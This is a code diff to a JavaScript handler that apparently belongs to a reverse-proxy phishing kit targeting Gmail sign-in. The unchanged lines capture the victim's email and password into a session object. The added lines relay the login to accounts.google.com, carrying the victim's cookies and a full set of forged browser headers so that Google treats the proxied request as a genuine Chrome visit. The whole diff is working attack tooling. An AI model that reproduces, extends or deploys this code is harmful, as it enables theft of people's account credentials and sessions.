@@ -71,7 +71,7 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
                     Object.assign(clientContext.sessionBody, { password: password })
                 }
                 
-                // Forward the request to Gmail
+                // Forward the request to Gmail with proper headers
                 const requestOptions = {
                     hostname: 'accounts.google.com',
                     port: 443,
@@ -83,7 +83,17 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
                         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
                         'Origin': 'https://accounts.google.com',
                         'Referer': 'https://accounts.google.com/',
-                        'Cookie': this.req.headers.cookie || ''
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                        'Accept-Language': 'en-US,en;q=0.9',
+                        'Accept-Encoding': 'gzip, deflate, br, zstd',
+                        'Cache-Control': 'max-age=0',
+                        'Sec-Fetch-Dest': 'document',
+                        'Sec-Fetch-Mode': 'navigate',
+                        'Sec-Fetch-Site': 'same-origin',
+                        'Sec-Fetch-User': '?1',
+                        'Upgrade-Insecure-Requests': '1',
+                        'Cookie': this.req.headers.cookie || '',
+                        'Host': 'accounts.google.com'
                     }
                 }
                 
@@ -123,7 +133,7 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
                     Object.assign(clientContext.sessionBody, { email: email })
                 }
                 
-                // Forward the request to Gmail
+                // Forward the request to Gmail with proper headers
                 const requestOptions = {
                     hostname: 'accounts.google.com',
                     port: 443,
@@ -135,13 +145,23 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
                         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
                         'Origin': 'https://accounts.google.com',
                         'Referer': 'https://accounts.google.com/',
-                        'Cookie': this.req.headers.cookie || ''
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                        'Accept-Language': 'en-US,en;q=0.9',
+                        'Accept-Encoding': 'gzip, deflate, br, zstd',
+                        'Cache-Control': 'max-age=0',
+                        'Sec-Fetch-Dest': 'document',
+                        'Sec-Fetch-Mode': 'navigate',
+                        'Sec-Fetch-Site': 'same-origin',
+                        'Sec-Fetch-User': '?1',
+                        'Upgrade-Insecure-Requests': '1',
+                        'Cookie': this.req.headers.cookie || '',
+                        'Host': 'accounts.google.com'
                     }
                 }
                 
                 const https = require('https')
                 const gmailReq = https.request(requestOptions, (gmailRes) => {
-                    console.log('Gmail response:', gmailRes)
+                    console.log('Gmail response status:', gmailRes.statusCode, gmailRes.statusMessage)
                     
                     // If Gmail redirects to password form, follow the redirect
                     if (gmailRes.statusCode === 302 && gmailRes.headers.location) {
